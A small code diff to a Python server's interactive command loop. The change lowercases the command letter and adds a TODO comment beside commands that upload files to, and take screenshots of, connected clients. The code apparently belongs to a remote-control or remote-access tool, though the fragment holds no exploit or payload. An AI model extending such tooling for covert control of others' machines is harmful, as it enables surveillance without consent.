@@ -16,7 +16,7 @@ class Server:
         while True:
             entered = input(">> ")
             if entered:
-                command = entered[0]
+                command = entered[0].lower()
                 attribute = entered[2:].split(" @ ")
 
                 if command == "h":
@@ -38,6 +38,7 @@ class Server:
                 elif command == "u" and len(attribute) == 3:
                     self.upload_file(attribute[0], attribute[1], self.get_conn_fgoi(attribute[2].split()))
                 elif command == "s" and len(attribute) == 3:
+                    # TODO less @
                     self.make_screenshot(attribute[0], attribute[1], self.get_conn_fgoi(attribute[2].split()))
                 elif command == "x":
                     self.connection.sock.close()
